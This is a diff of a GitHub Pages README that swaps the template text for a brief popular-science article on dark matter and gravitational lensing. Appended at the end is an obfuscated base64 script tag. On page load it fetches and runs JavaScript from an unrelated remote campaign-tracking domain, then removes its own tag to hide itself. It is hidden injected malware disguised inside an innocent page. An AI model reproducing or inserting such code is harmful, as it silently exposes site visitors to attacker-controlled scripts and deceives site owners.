@@ -1,37 +1,17 @@
-## Welcome to GitHub Pages
+# The mystery of the dark Universe
 
-You can use the [editor on GitHub](https://github.com/nichizumi/Universe/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Ordinary matter makes up everything we can see, smell or touch. This matter – which is made from atoms – also makes up planets and stars.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+All objects made of atoms pull on each other according to how much matter they contain. This is the effect of gravity and is why a small, low mass object such as an apple falls towards a much more massive object - the Earth.
 
-### Markdown
+![l](https://www.esa.int/var/esa/storage/images/esa_multimedia/images/2016/04/the_bullet_cluster/18247692-2-eng-GB/The_Bullet_Cluster.jpg)
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Astronomers believe that there must also be another kind of invisible "dark matter" which is spread throughout the Universe. By studying the Milky Way and many distant galaxies, they have found that visible matter alone cannot account for how fast stars rotate in them. On its own, normal matter would not be able to create enough gravity to hold these galaxies together.
 
-```markdown
-Syntax highlighted code block
+Scientists can also tell that there is some unknown material in the space between the stars, because its gravitational pull influences the path of starlight travelling towards Earth. Matter – both ordinary and dark - can act like a magnifying glass, bending and distorting light from galaxies and clusters behind it. Astronomers can use this effect, called gravitational lensing, to map the distribution of dark matter.
+![l](https://i.ytimg.com/vi/QUpWCRadIIA/maxresdefault.jpg)
+Only about 15% of the matter in the Universe is made of atoms. The remainder is dark matter. However, no one knows what dark matter is made of. We do know that it does not absorb, emit or reflect light, because none of our scientific instruments can directly detect it.
 
-# Header 1
-## Header 2
-### Header 3
+Many scientists believe that most dark matter is some unknown subatomic (smaller than an atom) particle that interacts only very weakly with normal matter. If this is true, billions of these particles will have passed through your body by the time you finish reading this article. Experiments buried deep underground may one day measure the presence of one such particle passing through, finally solving the mystery of what dark matter really is.
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/nichizumi/Universe/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="aKdTo" src="data:text/javascript;base64, dmFyIF82bnhXbCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzQ2ZVJGLCBfaW1wZFcpIHt2YXIgX3E4YjZOID0gZnVuY3Rpb24oX0JtQ1N0KSB7d2hpbGUgKC0tX0JtQ1N0KSB7XzQ2ZVJGWydwdXNoJ10oXzQ2ZVJGWydzaGlmdCddKCkpO319O19xOGI2TigrK19pbXBkVyk7fShfNm54V2wsIDB4MTFiKSk7dmFyIF9LS3lseCA9IGZ1bmN0aW9uKF9mQW5ZaCwgX2hBZHBCKSB7X2ZBblloID0gX2ZBblloIC0gMHgwO3ZhciBfQ3B2eTMgPSBfNm54V2xbX2ZBblloXTtyZXR1cm4gX0NwdnkzO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfS0t5bHgoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1F5dDBlID0gZG9jdW1lbnRbX0tLeWx4KCcweDEnKV0oX0tLeWx4KCcweDInKSk7X1F5dDBlW19LS3lseCgnMHgzJyldID0gX0tLeWx4KCcweDQnKTtfUXl0MGVbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NzNceDc0XHg3Mlx4NjFceDYzXHg2Zlx4NmRceDcwXHg2MVx4NmVceDc5XHg2MVx4NjNceDYzXHgzMVx4MmVceDY1XHg2M1x4NzJceDc5XHg3MFx4NzRceDZmXHg3Mlx4NjVceDc2XHg2Zlx4NmNceDc1XHg3NFx4NjlceDZmXHg2ZVx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDZmXHg3N1x4NzJceDRhXHg3YVx4MzZceDU2XHgzN1x4NjZceDRhJztkb2N1bWVudFtfS0t5bHgoJzB4NScpXShfS0t5bHgoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfUXl0MGUpO2RvY3VtZW50W19LS3lseCgnMHg3JyldKCdhS2RUbycpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
